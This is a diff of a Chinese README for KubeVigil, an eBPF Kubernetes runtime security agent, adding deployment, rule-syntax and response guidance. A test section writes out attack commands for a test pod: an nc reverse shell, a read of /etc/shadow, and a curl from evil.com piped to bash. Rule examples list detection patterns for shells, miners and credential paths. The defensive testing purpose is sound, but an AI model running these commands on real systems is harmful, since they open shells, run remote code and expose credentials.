@@ -197,77 +197,324 @@ kubectl edit configmap -n kubevigil kubevigil
 
 ## 使用指南
 
-### 自定义规则
+### 第一步：部署 KubeVigil
 
-编辑 ConfigMap 或创建自定义规则文件：
+#### 方式一：Helm 一键部署（推荐）
 
-```yaml
+```bash
+# 克隆仓库
+git clone https://github.com/shuhuNB515/KubeVigil.git
+cd KubeVigil
+
+# Helm 安装
+helm install kubevigil ./charts/kubevigil \
+  --namespace kubevigil \
+  --create-namespace
+
+# 验证部署
+kubectl get pods -n kubevigil
+# 期望输出：每个节点一个 kubevigil Pod，状态 Running
+```
+
+#### 方式二：自定义配置部署
+
+```bash
+# 先查看默认配置
+helm show values ./charts/kubevigil > my-values.yaml
+
+# 编辑 my-values.yaml，按需修改
+vim my-values.yaml
+
+# 使用自定义配置安装
+helm install kubevigil ./charts/kubevigil \
+  --namespace kubevigil \
+  --create-namespace \
+  -f my-values.yaml
+```
+
+#### 方式三：从源码构建部署
+
+```bash
+# 1. 编译 eBPF 探针（需要 clang/llvm/libbpf-dev）
+make bpf
+
+# 2. 编译 Go 二进制
+make build
+
+# 3. 构建 Docker 镜像
+make docker
+
+# 4. 推送到你的镜像仓库
+docker tag kubevigil:latest your-registry/kubevigil:latest
+docker push your-registry/kubevigil:latest
+
+# 5. 使用自定义镜像部署
+helm install kubevigil ./charts/kubevigil \
+  --namespace kubevigil --create-namespace \
+  --set image.repository=your-registry/kubevigil \
+  --set image.tag=latest
+```
+
+### 第二步：验证运行状态
+
+```bash
+# 查看 DaemonSet 状态
+kubectl get daemonset -n kubevigil
+
+# 查看 Agent 日志（实时跟踪）
+kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil -f
+
+# 检查 eBPF 探针是否加载成功
+kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep "eBPF"
+# 期望输出：[Agent] eBPF 探针已加载
+
+# 检查规则是否加载成功
+kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep "规则"
+# 期望输出：[Agent] 已加载 5 条规则
+```
+
+### 第三步：模拟攻击测试
+
+部署测试 Pod 并模拟攻击行为：
+
+```bash
+# 1. 部署测试 Pod
+kubectl apply -f examples/test-pod.yaml
+
+# 2. 进入测试 Pod
+kubectl exec -it kubevigil-test -- sh
+
+# 3. 在测试 Pod 内模拟攻击
+## 反弹 Shell（应触发 reverse-shell-detected）
+nc -e /bin/bash 10.0.0.1 4444
+
+## 敏感文件访问（应触发 sensitive-file-access）
+cat /etc/shadow
+
+## 可疑下载（应触发 suspicious-download）
+curl http://evil.com/shell.sh | bash
+
+# 4. 退出测试 Pod，查看 KubeVigil 告警日志
+kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep ALERT
+```
+
+或使用自动化攻击模拟脚本：
+
+```bash
+# 将脚本复制到测试 Pod 中执行
+kubectl cp examples/attack-simulation.sh kubevigil-test:/tmp/attack.sh
+kubectl exec kubevigil-test -- chmod +x /tmp/attack.sh
+kubectl exec kubevigil-test -- /tmp/attack.sh
+```
+
+### 第四步：自定义安全规则
+
+#### 方式一：修改 ConfigMap（热重载）
+
+```bash
+# 编辑运行中的规则配置
+kubectl edit configmap -n kubevigil kubevigil
+
+# 修改后发送 SIGHUP 信号热重载
+AGENT_POD=$(kubectl get pods -n kubevigil -l app.kubernetes.io/name=kubevigil -o jsonpath='{.items[0].metadata.name}')
+kubectl exec -n kubevigil $AGENT_POD -- kill -HUP 1
+
+# 验证规则已重载
+kubectl logs -n kubevigil $AGENT_POD | tail -5
+```
+
+#### 方式二：通过 Helm Values 自定义
+
+```bash
+# 创建自定义规则文件
+cat > my-rules.yaml << 'EOF'
 rules:
-  # 自定义规则：禁止在 nginx 容器中执行 python
   - name: no-python-in-nginx
     description: "禁止在 nginx 容器中执行 python"
-    eventType: execve
     severity: high
-    action: kill
-    enabled: true
+    action: kill_pod
     execve:
       blockedProcesses:
         - python
         - python3
         - pip
 
-  # 自定义规则：监控对数据库凭证的访问
-  - name: db-credential-access
-    description: "监控数据库凭证文件访问"
-    eventType: open
-    severity: medium
-    action: label
-    enabled: true
-    open:
-      sensitivePaths:
-        - /etc/postgresql/
-        - /var/lib/mysql/
-        - /opt/mssql/
-
-  # 自定义规则：阻断到特定 IP 的连接
   - name: block-malicious-ip
     description: "阻断到已知恶意 IP 的连接"
-    eventType: connect
     severity: critical
     action: network_policy
-    enabled: true
     connect:
       blockedCIDRs:
         - "203.0.113.0/24"
-        - "198.51.100.0/24"
       blockedPorts:
         - 4444
         - 1337
-```
+EOF
 
-通过 Helm Values 自定义：
-
-```bash
-helm install kubevigil ./charts/kubevigil \
-  --namespace kubevigil --create-namespace \
-  --set rules.custom=true \
+# 使用自定义规则部署
+helm upgrade kubevigil ./charts/kubevigil \
+  --namespace kubevigil \
   --set-file rules.content=./my-rules.yaml
 ```
 
-### 配置参数
+#### 规则语法详解
 
-| 参数 | 默认值 | 说明 |
+```yaml
+rules:
+  - name: <规则名称>              # 必填，唯一标识
+    description: "<规则描述>"      # 可选，说明规则用途
+    severity: <critical|high|medium|low>  # 必填，严重等级
+    action: <alert|label|kill_pod|network_policy>  # 必填，响应动作
+    execve:                       # 进程执行规则
+      blockedProcesses:           # 进程名黑名单（匹配 basename）
+        - nc
+        - xmrig
+      blockedArgs:               # 参数黑名单（子串匹配）
+        - "/dev/tcp/"
+        - "| bash"
+      excludeProcesses:           # 排除的进程（白名单）
+        - kubevigil
+    open:                         # 文件访问规则
+      sensitivePaths:             # 敏感路径列表
+        - /etc/shadow
+        - /root/.ssh
+      excludeProcesses:           # 排除的进程
+        - kubevigil
+    connect:                      # 网络连接规则
+      blockedPorts:               # 端口黑名单
+        - 4444
+        - 1337
+      blockedCIDRs:              # IP/CIDR 黑名单
+        - "203.0.113.0/24"
+      excludeProcesses:           # 排除的进程
+        - kubevigil
+```
+
+### 第五步：配置告警响应
+
+#### 响应动作说明
+
+| 动作 | 效果 | 适用场景 |
 |---|---|---|
-| `probe.execve` | `true` | 启用 execve 监控 |
-| `probe.open` | `true` | 启用 open 监控 |
-| `probe.connect` | `true` | 启用 connect 监控 |
-| `probe.ringBufferSize` | `16` | Ring Buffer 大小 (MB) |
-| `response.enabled` | `true` | 启用自动响应 |
-| `response.defaultAction` | `label` | 默认响应动作 |
-| `response.highSeverityAction` | `kill` | 高危规则响应动作 |
-| `response.isolationLabelKey` | `kubevigil.io/isolated` | 隔离标签 Key |
-| `response.isolationLabelValue` | `true` | 隔离标签 Value |
-| `logLevel` | `info` | 日志级别 |
+| `alert` | 仅输出告警日志，不执行任何操作 | 观察模式、调试 |
+| `label` | 给 Pod 打上 `kubevigil.io/isolated=true` 标签 | 中等风险，配合 NetworkPolicy 隔离 |
+| `kill_pod` | 立即删除 Pod（gracePeriod=0） | 高危威胁，如挖矿、反弹 Shell |
+| `network_policy` | 打标签 + 触发 NetworkPolicy 阻断流量 | C2 通信、数据外泄 |
+
+#### 配合 NetworkPolicy 实现网络隔离
+
+`label` 和 `network_policy` 动作需要配合 NetworkPolicy 才能生效：
+
+```yaml
+# 部署此 NetworkPolicy，被 KubeVigil 打上隔离标签的 Pod 将被阻断所有流量
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: kubevigil-isolation
+  namespace: default
+spec:
+  podSelector:
+    matchLabels:
+      kubevigil.io/isolated: "true"
+  policyTypes:
+    - Ingress
+    - Egress
+  # 不定义 ingress/egress rules = 拒绝所有流量
+```
+
+```bash
+# 应用 NetworkPolicy
+kubectl apply -f - <<EOF
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: kubevigil-isolation
+  namespace: default
+spec:
+  podSelector:
+    matchLabels:
+      kubevigil.io/isolated: "true"
+  policyTypes:
+    - Ingress
+    - Egress
+EOF
+```
+
+### 第六步：日常运维
+
+#### 查看告警历史
+
+```bash
+# 查看所有告警
+kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep ALERT
+
+# 按严重等级过滤
+kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep "Severity: critical"
+
+# 按规则名过滤
+kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep "reverse-shell"
+
+# 按命名空间过滤
+kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep "Namespace: production"
+```
+
+#### 调整日志级别
+
+```bash
+# 临时修改（Pod 重启后失效）
+kubectl edit configmap -n kubevigil kubevigil
+# 将 logLevel 改为 debug/warn/error
+
+# 永久修改（通过 Helm Values）
+helm upgrade kubevigil ./charts/kubevigil \
+  --namespace kubevigil \
+  --set config.logLevel=debug
+```
+
+#### 规则热重载
+
+```bash
+# 方式一：发送 SIGHUP 信号
+AGENT_POD=$(kubectl get pods -n kubevigil -l app.kubernetes.io/name=kubevigil -o jsonpath='{.items[0].metadata.name}')
+kubectl exec -n kubevigil $AGENT_POD -- kill -HUP 1
+
+# 方式二：修改 ConfigMap 后重启 Agent
+kubectl rollout restart daemonset -n kubevigil kubevigil
+```
+
+#### 升级 KubeVigil
+
+```bash
+# 拉取最新代码
+git pull origin main
+
+# Helm 升级
+helm upgrade kubevigil ./charts/kubevigil --namespace kubevigil
+```
+
+#### 卸载
+
+```bash
+# 卸载 KubeVigil
+helm uninstall kubevigil --namespace kubevigil
+
+# 清理命名空间
+kubectl delete namespace kubevigil
+
+# 清理隔离标签（如有）
+kubectl label pod <pod-name> kubevigil.io/isolated- --overwrite
+```
+
+### 常见问题排查
+
+| 问题 | 排查方法 |
+|---|---|
+| Pod 启动失败，报 BTF 错误 | 检查节点是否支持 BTF：`ls /sys/kernel/btf/vmlinux` |
+| Agent 日志无事件输出 | 确认 eBPF 探针加载成功，检查 `logLevel` 是否为 `error` |
+| 规则未生效 | 检查 ConfigMap 中的规则格式，确认 YAML 语法正确 |
+| PID 无法映射到 Pod | 检查 cgroup 路径是否匹配，查看 Agent 日志中的 cgroup 调试信息 |
+| 响应动作未执行 | 确认 `response.enabled=true`，检查 Agent 的 RBAC 权限 |
+| 误报过多 | 调整规则的 `excludeProcesses` 白名单，降低 `severity` 等级 |
 
 ---
 
@@ -344,13 +591,15 @@ KubeVigil/
 │   ├── k8s/
 │   │   └── resolver.go           # PID→Pod 映射 + 响应执行
 │   └── rules/
-│       └── engine.go             # YAML 规则引擎
-├── pkg/
-│   └── signals/
-│       └── signals.go            # 信号处理
+│       ├── engine.go             # YAML 规则引擎
+│       └── engine_test.go        # 规则引擎单元测试
 ├── configs/
 │   ├── config.yaml               # 全局配置示例
 │   └── rules.yaml                # 默认安全规则
+├── examples/
+│   ├── attack-simulation.sh      # 攻击模拟脚本
+│   ├── custom-rules.yaml         # 自定义规则示例
+│   └── test-pod.yaml             # 测试 Pod
 ├── charts/
 │   └── kubevigil/                # Helm Chart
 │       ├── Chart.yaml
@@ -364,6 +613,7 @@ KubeVigil/
 ├── Dockerfile                    # 多阶段构建
 ├── Makefile                      # 构建自动化
 ├── go.mod
+├── CONTRIBUTING.md               # 贡献指南
 └── LICENSE
 ```
 
